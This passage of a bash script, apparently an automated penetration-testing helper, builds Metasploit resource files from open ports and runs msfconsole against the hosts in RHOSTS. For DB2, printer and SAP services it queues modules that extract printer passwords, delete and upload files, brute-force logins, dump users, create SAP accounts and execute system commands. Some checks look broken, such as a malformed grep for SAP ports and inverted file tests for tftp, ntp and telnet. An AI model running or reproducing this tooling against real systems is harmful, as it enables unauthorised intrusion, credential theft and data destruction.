	echo "set RHOSTS $RHOSTS" >>db2.rc
	echo "exploit" >>db2.rc
	echo "back" >>db2.rc
	echo "use auxiliary/scanner/db2/db2_version" >> db2.rc
	echo "set RHOSTS $RHOSTS" >>db2.rc
	echo "exploit" >>db2.rc
	echo "back" >>db2.rc
	echo "use auxiliary/scanner/db2/discovery" >> db2.rc
	echo "set RHOSTS $RHOSTS" >>db2.rc
	echo "exploit" >>db2.rc
	echo "back" >>db2.rc
<<db2
use auxiliary/scanner/db2/db2_auth
use auxiliary/scanner/db2/db2_version
use auxiliary/scanner/db2/discovery
db2
	fi
	if echo "${var[@]}" | grep -w "2081" &>/dev/null; then
	echo "use auxiliary/scanner/printer/canon_iradv_pwd_extract" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_delete_file" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_download_file" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_env_vars" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_list_dir" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_list_volumes" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_ready_message" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_upload_file" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
	echo "use auxiliary/scanner/printer/printer_version_info" >> printer.rc
	echo "set RHOSTS $RHOSTS" >>printer.rc
	echo "exploit" >>printer.rc
	echo "back" >>printer.rc
<<printer
use auxiliary/scanner/printer/canon_iradv_pwd_extract
use auxiliary/scanner/printer/printer_delete_file
use auxiliary/scanner/printer/printer_download_file
use auxiliary/scanner/printer/printer_env_vars
use auxiliary/scanner/printer/printer_list_dir
use auxiliary/scanner/printer/printer_list_volumes
use auxiliary/scanner/printer/printer_ready_message
use auxiliary/scanner/printer/printer_upload_file
use auxiliary/scanner/printer/printer_version_info
printer
	fi
	if echo "${var[@]}" | (grep -w "3600" -o grep -w "3300" -o grep -w "3200") &>/dev/null; then  #SAP常用端口 3200、3300、3600 
	echo "use auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_icf_public_info" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_icm_urlscan" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_abaplog" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_brute_login" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_extractusers" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_getenv" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_startprofile" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_mgmt_con_version" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_router_info_request" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_router_portscanner" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_service_discovery" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_smb_relay" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_bapi_user_create1" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_brute_login" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_ping" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_read_table" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_rfc_system_info" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_soap_th_saprel_disclosure" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
	echo "use auxiliary/scanner/sap/sap_web_gui_brute_login" >> sap.rc
	echo "set RHOSTS $RHOSTS" >>sap.rc
	echo "exploit" >>sap.rc
	echo "back" >>sap.rc
<<sap
use auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt
use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
use auxiliary/scanner/sap/sap_icf_public_info
use auxiliary/scanner/sap/sap_icm_urlscan
use auxiliary/scanner/sap/sap_mgmt_con_abaplog
use auxiliary/scanner/sap/sap_mgmt_con_brute_login
use auxiliary/scanner/sap/sap_mgmt_con_extractusers
use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints
use auxiliary/scanner/sap/sap_mgmt_con_getenv
use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles
use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist
use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter
use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties
use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles
use auxiliary/scanner/sap/sap_mgmt_con_startprofile
use auxiliary/scanner/sap/sap_mgmt_con_version
use auxiliary/scanner/sap/sap_router_info_request
use auxiliary/scanner/sap/sap_router_portscanner
use auxiliary/scanner/sap/sap_service_discovery
use auxiliary/scanner/sap/sap_smb_relay
use auxiliary/scanner/sap/sap_soap_bapi_user_create1
use auxiliary/scanner/sap/sap_soap_rfc_brute_login
use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing
use auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence
use auxiliary/scanner/sap/sap_soap_rfc_ping
use auxiliary/scanner/sap/sap_soap_rfc_read_table
use auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir
use auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface
use auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec
use auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_system_info
use auxiliary/scanner/sap/sap_soap_th_saprel_disclosure
use auxiliary/scanner/sap/sap_web_gui_brute_login
sap
	fi


	if [[ ! -f "sum.rc" ]]; then
		touch sum.rc
	fi
	if [[ -f "ftp.rc" ]]; then
		cat ftp.rc >> sum.rc
	fi
	if [[ -f "sap.rc" ]]; then
		cat sap.rc >> sum.rc
	fi
	if [[ -f "printer.rc" ]]; then
		cat printer.rc >> sum.rc
	fi
	if [[ -f "afp.rc" ]]; then
		cat afp.rc >> sum.rc
	fi
	if [[ -f "http.rc" ]]; then
		cat http.rc >> sum.rc
	fi
	if [[ -f "sip.rc" ]]; then
		cat sip.rc >> sum.rc
	fi
	if [[ -f "snmp.rc" ]]; then
		cat snmp.rc >> sum.rc
	fi
	if [[ -f "ssl.rc" ]]; then
		cat ssl.rc >> sum.rc
	fi
	if [[ -f "scada.rc" ]]; then
		cat scada.rc >> sum.rc
	fi
	if [[ -f "redis.rc" ]]; then
		cat redis.rc >> sum.rc
	fi
	if [[ -f "rdp.rc" ]]; then
		cat rdp.rc >> sum.rc
	fi
	if [[ -f "postgres.rc" ]]; then
		cat postgres.rc >> sum.rc
	fi
	if [[ -f "pcanywhere.rc" ]]; then
		cat pcanywhere.rc >> sum.rc
	fi
	if [[ -f "smb.rc" ]]; then
		cat smb.rc >> sum.rc 
	fi
	if [[ -f "ssh.rc" ]]; then
		cat ssh.rc >> sum.rc 
	fi
	if [[ -f "smtp.rc" ]]; then
		cat smtp.rc >> sum.rc 
	fi	
	if [[ ! -f "tftp.rc" ]]; then
		cat tftp.rc >> sum.rc
	fi
	if [[ ! -f "ntp.rc" ]]; then
		cat ntp.rc >> sum.rc
	fi
	if [[ -f "pop3.rc" ]]; then
		cat pop3.rc >> sum.rc 
	fi
	if [[ -f "mysql.rc" ]]; then
		cat mysql.rc >> sum.rc 
	fi
	if [[ -f "oracle.rc" ]]; then
		cat oracle.rc >> sum.rc 
	fi
	if [[ -f "mssql.rc" ]]; then
		cat mssql.rc >> sum.rc 
	fi
	if [[ ! -f "telnet.rc" ]]; then
		cat telnet.rc >> sum.rc
	fi
	if [[ -f "misc_sum.rc" ]]; then
		cat misc_sum.rc >> sum.rc
	fi
	script -q -c "msfconsole"  << EOF /dev/null
	resource sum.rc
	exit
EOF
fi
;;
2)
exit
;;
esac



